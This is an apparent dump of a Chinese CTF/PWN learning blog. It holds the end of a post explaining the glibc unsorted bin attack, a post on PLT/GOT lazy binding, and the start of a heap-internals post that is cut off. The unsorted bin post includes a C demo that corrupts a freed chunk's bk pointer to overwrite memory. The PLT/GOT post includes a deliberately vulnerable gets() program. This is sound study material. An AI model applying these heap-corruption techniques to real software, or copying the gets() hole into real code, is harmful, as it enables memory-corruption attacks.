title=\"3.原理解释\"></a>3.原理解释</h3><ol>\n<li><p>unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空）<img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212418753.png\" alt=\"image-20201222212418753\"></p>\n</li>\n<li><p>如果在取走堆块之前，我们将unsortedbin中的chunk的bk指针改为我们的target地址，如下图所示：<img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222212555394.png\" alt=\"image-20201222212555394\"></p>\n</li>\n<li><p>此时我们去malloc堆块的时候就会发生如下代码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** victim is free chunk **/</span></span><br><span class=\"line\">bck = victim-&gt;bk;</span><br><span class=\"line\">unsorted_chunks(av)-&gt;bk = bck;</span><br><span class=\"line\">bck-&gt;fd = unsorted_chunks(av);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213058942.png\" alt=\"image-20201222213058942\"></p>\n<p>在我们移除victim之后就变成了这样。我们的target的fd的内容为malloc_state结构体的unsortedbin链的fd指针了</p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222213335526.png\" alt=\"image-20201222213335526\"></p>\n</li>\n</ol>\n<h3 id=\"4-演示\"><a href=\"#4-演示\" class=\"headerlink\" title=\"4.演示\"></a>4.演示</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"This file demonstrates unsorted bin attack by write a large \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"unsigned long value into stack\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(</span><br><span class=\"line\">      <span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">      <span class=\"string\">\"In practice, unsorted bin attack is generally prepared for further \"</span></span><br><span class=\"line\">      <span class=\"string\">\"attacks, such as rewriting the \"</span></span><br><span class=\"line\">      <span class=\"string\">\"global variable global_max_fast in libc for further fastbin attack\\n\\n\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> target_var = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">          <span class=\"string\">\"Let's first look at the target we want to rewrite on stack:\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"%p: %ld\\n\\n\"</span>, &amp;target_var, target_var);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> *p = <span class=\"built_in\">malloc</span>(<span class=\"number\">400</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Now, we allocate first normal chunk on the heap at: %p\\n\"</span>,</span><br><span class=\"line\">          p);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"And allocate another normal chunk in order to avoid \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"consolidating the top chunk with\"</span></span><br><span class=\"line\">                  <span class=\"string\">\"the first one during the free()\\n\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">malloc</span>(<span class=\"number\">500</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">free</span>(p);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"We free the first chunk now and it will be inserted in the \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"unsorted bin with its bk pointer \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"point to %p\\n\"</span>,</span><br><span class=\"line\">          (<span class=\"keyword\">void</span> *)p[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*------------VULNERABILITY-----------*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">  p[<span class=\"number\">1</span>] = (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>)(&amp;target_var - <span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Now emulating a vulnerability that can overwrite the \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"victim-&gt;bk pointer\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"And we write it with the target address-16 (in 32-bits \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"machine, it should be target address-8):%p\\n\\n\"</span>,</span><br><span class=\"line\">          (<span class=\"keyword\">void</span> *)p[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//------------------------------------</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">malloc</span>(<span class=\"number\">400</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Let's malloc again to get the chunk we just free. During \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"this time, target should has already been \"</span></span><br><span class=\"line\">                  <span class=\"string\">\"rewrite:\\n\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"%p: %p\\n\"</span>, &amp;target_var, (<span class=\"keyword\">void</span> *)target_var);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/image-20201222164945226.png\" alt=\"image-20201222164945226\"></p>\n<p><img src=\"/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/unsorted_bin_attack_order.png\" alt=\"img\"></p>\n<p>经过上面原理的解释，这个就不说了</p>\n<p>最后总结一句话:</p>\n<p>修改 target 处的值为 unsorted bin 的链表头部 0x7f1c705ffb78，也就是之前输出的信息。我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。</p>\n</blockquote>\n","categories":["PWN"],"tags":["PWN"]},{"title":"plt表和got表","url":"https://pz1o.top/2020/12/16/plt表和got表/","content":"<p>需要啥 学啥</p>\n<p>看学长博客写了这个 自己也记录一下 毕竟刚学</p>\n<p><a href=\"https://ld1ng.com/2020/06/16/GOTPLT/\" target=\"_blank\" rel=\"noopener\">https://ld1ng.com/2020/06/16/GOTPLT/</a></p>\n<p><a href=\"https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_18661257/article/details/54694748?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-54694748.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>\n<p><a href=\"https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/ATFWUS/article/details/104563414?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160816708616780266263628%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=160816708616780266263628&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-104563414.first_rank_v2_pc_rank_v29&amp;utm_term=plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8</a></p>\n<h1 id=\"GOT表和PLT表\"><a href=\"#GOT表和PLT表\" class=\"headerlink\" title=\"GOT表和PLT表\"></a>GOT表和PLT表</h1><p>GOT（全局偏移表）和 PLT(过程链接表)，是两个表之间的交互才使得函数实现延迟绑定，通过这种方法将过程地址的绑定推迟到第一次调用该函数。</p>\n<h1 id=\"引入\"><a href=\"#引入\" class=\"headerlink\" title=\"引入\"></a>引入</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">win</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"you win\\n\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">100</span>];</span><br><span class=\"line\">\tgets(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"you lose\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译这个文件</p>\n<p>gdb调试一下</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216221001253.png\" alt=\"image-20201216221001253\"></p>\n<p>此时我们可以看到<code>gets@plt</code>和<code>puts@plt</code>这两个函数</p>\n<p>@plt这里的意思是指PLT表中的数据的地址。</p>\n<blockquote>\n<p>为了更好的用户体验和内存CPU的利用率，程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，PLT表可以称为内部函数表，GOT表为全局函数表（也可以说是动态函数表这是个人自称），这两个表是相对应的，什么叫做相对应呢，PLT表中的数据就是GOT表中的一个地址，可以理解为一定是一一对应的，</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123151558845\" alt=\"这里写图片描述\"></p>\n</blockquote>\n<p>这时 我们也就理解了@plt标志的函数，这个函数其实就是个过渡作用，因为GOT表项中的数据才是函数最终的地址，而PLT表中的数据又是GOT表项的地址，我们就可以通过PLT表跳转到GOT表来得到函数真正的地址。</p>\n<p>那@plt函数里面是什么呢</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">disass gets</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201216223010888.png\" alt=\"image-20201216223010888\"></p>\n<blockquote>\n<ol>\n<li>jmp指令跳转到GOT表</li>\n<li>GOT表中的数据为0x4004c6</li>\n<li>跳转到指令地址为0x4004c6</li>\n<li>执行<code>push 0x3</code>这个为在GOT中的下标序号</li>\n<li>在执行<code>jmp 0x400480</code></li>\n<li>而0x400480为PLT[0]的地址</li>\n<li>PLT[0]的指令会进入动态链接器的入口</li>\n<li>执行一个函数将真正的函数地址覆盖到GOT表中</li>\n</ol>\n</blockquote>\n<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>1.<strong>PLT[0]处到底做了什么，按照我们之前的思路它不是应该跳转到GOT[0]吗</strong></p>\n<p>这是plt[0]中的内容</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/image-20201217082532501.png\" alt=\"image-20201217082532501\"></p>\n<p>后面的16进制就是GOT表中的内容</p>\n<blockquote>\n<p><strong>我们的PLT[0]根本没有跳转到GOT[0]，它不像我们的PLT[1]这些存储的是GOT表项的地址，它是一些代码指令，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</strong></p>\n</blockquote>\n<p>所以我们可以得到下面这张图</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20170123155535419\" alt=\"这里写图片描述\"></p>\n<p>而plt[0]代码做的事情则是：由于GOT[2]中存储的是动态链接器的入口地址，所以通过<strong>GOT[1]中的数据作为参数，跳转到GOT[2]所对应的函数入口地址，这个动态链接器会将一个函数的真正地址绑定到相应的GOT[x]中。</strong></p>\n<p>总而言之，我们调用一个函数的时候有两种方法，一个是通过PLT表调用，一个则是通过GOT表调用，<strong>因为PLT表最终也是跳转GOT表，GOT表中则是一个函数真正的地址，这里需要注意的是，在一个函数没有运行一次之前，GOT表中的数据为@plt函数中下一条指令的地址。</strong></p>\n<p>2.<strong>为什么中间要进行push压栈操作？</strong></p>\n<p>中间进行的压栈是为了确定PLT对应的GOT表项，即是PLT[1]−&gt;GOT[3]，0x3就是GOT的下标3，也就是说压栈后我们跳转到PLT[0],接着PLT[0]中的指令会通过这次压栈的序号来确定操作的GOT表项为多少</p>\n<p>3.<strong>压入的序号为什么为0x3，不是最开始应该为0x0吗？</strong></p>\n<p>因为GOT[0],GOT[1],GOT[2]都有其他用处，所以从0x3开始。</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><h2 id=\"GOT表的构成\"><a href=\"#GOT表的构成\" class=\"headerlink\" title=\"GOT表的构成\"></a>GOT表的构成</h2><p>GOT[0]包含.dynamic段的地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</p>\n<p>GOT[1]包含动态链接器的标识;</p>\n<p>GOT[2]包含动态链接器的延迟绑定代码的入口点。</p>\n<p>GOT的其他表目为本模块要引用的一个全局变量或函数的地址。</p>\n<h2 id=\"PLT表的构成\"><a href=\"#PLT表的构成\" class=\"headerlink\" title=\"PLT表的构成\"></a>PLT表的构成</h2><p>PLT表并不是每个表项都用于存放“函数地址“，其中PLT[0]是一个特殊的表目，它跳转到动态链接器中执行，换句话说，PLT[0]是一个函数，这个函数的作用是通过GOT[1]和GOT[2]来正确绑定一个函数的正式地址到GOT表中来。</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><p>最后，自己总结一下实现过程</p>\n<ol>\n<li>首先，进入PLT表项，这时第一步就是跳转到GOT表项</li>\n<li>GOT表项存放PLT表第二条指令的地址，也就是<code>push 0x x</code>把相应的idx压入</li>\n<li>下一步就是跳转到PLT[0]中，进而链接到GOT[2] ,进入链接器入口</li>\n<li>最后通过动态链接器将真正函数地址覆盖到GOT表中</li>\n</ol>\n<p>别人的动图</p>\n<p><img src=\"/2020/12/16/plt%E8%A1%A8%E5%92%8Cgot%E8%A1%A8/20200208160601515.gif\" alt=\"在这里插入图片描述\"></p>\n","categories":["PWN"],"tags":["PWN"]},{"title":"堆","url":"https://pz1o.top/2020/12/15/堆/","content":"<h1 id=\"堆-持续更新\"><a href=\"#堆-持续更新\" class=\"headerlink\" title=\"堆(持续更新)\"></a>堆(持续更新)</h1><p><a href=\"https://ld1ng.com/2020/07/23/Heap/\" target=\"_blank\" rel=\"noopener\">https://ld1ng.com/2020/07/23/Heap/</a></p>\n<p><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap</a></p>\n<p>上一个PWN学习 学得不太全面</p>\n<p>写这个主要是为了自己能够全面复习堆的基础知识</p>\n<p>由于我没学过操作系统 有些相关知识可能不太对 还请指正</p>\n<h2 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h2><h3 id=\"0x01-什么是堆\"><a href=\"#0x01-什么是堆\" class=\"headerlink\" title=\"0x01 什么是堆\"></a>0x01 什么是堆</h3><ul>\n<li>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存</li>\n<li>堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长</li>\n<li>我们一般成管理堆的那部分程序为堆管理器</li>\n</ul>\n<p>堆管理器处于用户程序与内核中间，主要做以下工作</p>\n<ul>\n<li>malloc</li>\n<li>free</li>\n</ul>\n<h3 id=\"0x02-如何分配堆和释放堆\"><a href=\"#0x02-如何分配堆和释放堆\" class=\"headerlink\" title=\"0x02 如何分配堆和释放堆\"></a>0x02 如何分配堆和释放堆</h3><h4 id=\"1-malloc函数\"><a href=\"#1-malloc函数\" class=\"headerlink\" title=\"1.malloc函数\"></a>1.<strong>malloc函数</strong></h4><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> *<span class=\"title\">malloc</span><span class=\"params\">(<span class=\"keyword\">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>该函数返回对应大小字节的内存块的指针</li>\n<li>此外，该函数还对一些异常情况进行了处理</li>\n<li>当n=0时，返回当前系统允许的堆的最小内存块</li>\n<li><strong>当n为负数时，由于在大多数系统中，size_t是无符号数，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配</strong></li>\n</ul>\n<h4 id=\"2-free函数\"><a href=\"#2-free函数\" class=\"headerlink\" title=\"2.free函数\"></a>2.<strong>free函数</strong></h4><figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">free</span><span class=\"params\">(<span class=\"keyword\">void</span> *p)</span></span>;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>该函数会释放由p所指向的内存块。这个内存块有可能是通过malloc函数得到的，也有可能是通过相关的函数realloc得到的</li>\n</ul>\n<p>该函数还对异常情况进行了一下处理</p>\n<ul>\n<li>当p为空指针时，函数不执行任何操作</li>\n<li>当p已经被释放之后，再次释放会出现错误的效果，这其实就是double free</li>\n<li>除了被禁用（mallocpt）的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便减小程序所使用的内存空间</li>\n</ul>\n<h3 id=\"0x03-如何实现堆\"><a href=\"#0x03-如何实现堆\" class=\"headerlink\" title=\"0x03 如何实现堆\"></a>0x03 如何实现堆</h3><ul>\n<li>堆的glibc实现主要包括struct _heap_info，struct malloc_state，struct malloc_chunk这3个结构体</li>\n</ul>\n<h4 id=\"1-Arena\"><a href=\"#1-Arena\" class=\"headerlink\" title=\"1.Arena\"></a>1.Arena</h4><p><img src=\"/2020/12/15/%E5%A0%86/image-20201212002041969.png\" alt=\"image-20201212002041969\"></p>\n<blockquote>\n<ul>\n<li>一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</li>\n<li>主线程的arnea称为“main_arena”。子线程的arnea称为“thread_arena”</li>\n</ul>\n</blockquote>\n<h5 id=\"Arena的数量及管理\"><a href=\"#Arena的数量及管理\" class=\"headerlink\" title=\"Arena的数量及管理\"></a>Arena的数量及管理</h5><p>我们说到有主线程和子线程的arena</p>\n<p><strong>那么每个程序的arena的数量应该就是有限的</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">32</span>位系统中：</span><br><span class=\"line\">     Number of arena = <span class=\"number\">2</span> * number of cores + <span class=\"number\">1.</span></span><br><span class=\"line\"><span class=\"number\">64</span>位系统中：</span><br><span class=\"line\">     Number of arena = <span class=\"number\">8</span> * number of cores + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>这里就会涉及一个多线程共享问题</p>\n<blockquote>\n<p>eg：一个主Arena 两个副Arena</p>\n<p>如果有一个4线程（大于3个Arena）的程序，显然这里就会出现一个共享问题</p>\n<p><strong>此时glibc malloc会做以下操作：</strong></p>\n<ul>\n<li>首先，glibc malloc循环遍历所有可用的竞技场，在遍历的过程中，它会尝试锁该竞技场。如果成功锁（该竞技场当前对应的线程并未使用堆内存则表示可锁），那么该竞技场就可以被线程3所使用</li>\n<li>而如果没能找到可用的舞台上，那么就将线程3的malloc的操作阻塞，直到有可用的舞台为止</li>\n<li>当线程3的malloc阻塞解除时，glibc malloc就会先尝试使用最近访问的竞技场（此时为主竞技场）。如果此时主竞技场可用的话，就直接使用，否则就将线程3再次阻塞，直到主舞台上再次可用为止</li>\n</ul>\n</blockquote>\n<h4 id=\"2-malloc-state\"><a href=\"#2-malloc-state\" class=\"headerlink\" title=\"2.malloc_state\"></a>2.<strong>malloc_state</strong></h4><ul>\n<li>glibc的中arnea就是用这个结构体表示的</li>\n<li>其中包含很多的信息：各种bins的信息，top chunk以及最后一个剩余chunk等</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Serialize access.  */</span></span><br><span class=\"line\">  __libc_lock_define (, mutex);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Flags (formerly in max_fast).  */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> flags;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> have_fastchunks;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Fastbins */</span></span><br><span class=\"line\">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class=\"line\">  mchunkptr top;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* The remainder from the most recent split of a small request */</span></span><br><span class=\"line\">  mchunkptr last_remainder;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Normal bins packed as described above */</span></span><br><span class=\"line\">  mchunkptr bins[NBINS * <span class=\"number\">2</span> - <span class=\"number\">2</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Bitmap of bins */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> binmap[BINMAPSIZE];</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Linked list */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class=\"line\"><span class=\"comment\">     by free_list_lock in arena.c.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">malloc_state</span> *<span class=\"title\">next_free</span>;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class=\"line\"><span class=\"comment\">     the free list.  Access to this field is serialized by</span></span><br><span class=\"line\"><span class=\"comment\">     free_list_lock in arena.c.  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T attached_threads;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"comment\">/* Memory allocated from the system in this arena.  */</span></span><br><span class=\"line\">  INTERNAL_SIZE_T system_mem;</span><br><span class=\"line\">  INTERNAL_SIZE_T max_system_mem;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><strong>fastbinsY数组：</strong>存储的是该领域管理的fastbins</li>\n<li><strong>bins数组：</strong>存储的是该领域管理的smallbins，unsortedbin，largebin</li>\n<li><strong>binmap变量：</strong>系统查看有哪些垃圾箱链中有块时，不可能去fastbinsY和箱数组一个一个的遍历通过binmap变量，采用二进制存储，将二进制位与数组的索引相对，系统查找箱链时可以。通过按位与来查询，这样更高效。虽然unsigned 